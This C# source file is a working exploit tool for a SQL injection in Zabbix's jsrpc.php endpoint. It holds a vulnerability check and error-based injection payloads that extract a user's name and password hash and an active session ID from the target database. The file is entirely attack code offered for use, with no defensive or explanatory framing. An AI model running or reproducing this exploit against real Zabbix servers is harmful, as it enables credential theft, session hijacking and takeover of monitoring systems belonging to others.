using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using HttpCodeLib;
namespace ZabbixExp
{
    public class ZabbixFker
    {
        private static readonly string userNamePasswordPayLoad =
            "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";

        private static readonly string sessionPayLoad = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)";
        public bool ExistExp(string url,CookieContainer cc)
        {
            string payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1";
            return new XJHTTP().GetHtml(url + payload ,cc).Html.Contains(@"INSERT INTO profiles");
        }

        public string SqlInject(string url, string sqlQuery, CookieContainer cc)
        {
            var payload =
                "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" +
                Uri.EscapeUriString(sqlQuery) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1";
            return
                new Regex(@"Duplicate\s*entry\s*'~(.+?)~1", RegexOptions.IgnoreCase).Match(
                    new XJHTTP().GetHtml(url + payload,cc).Html).Groups[1].Value;
        }

        public string getUserNamePassword(string url, CookieContainer cc)
        {
            return SqlInject(url, userNamePasswordPayLoad,cc);
        }
        public string getSession(string url, CookieContainer cc)
        {
            return SqlInject(url, sessionPayLoad, cc);
        }

    }
}
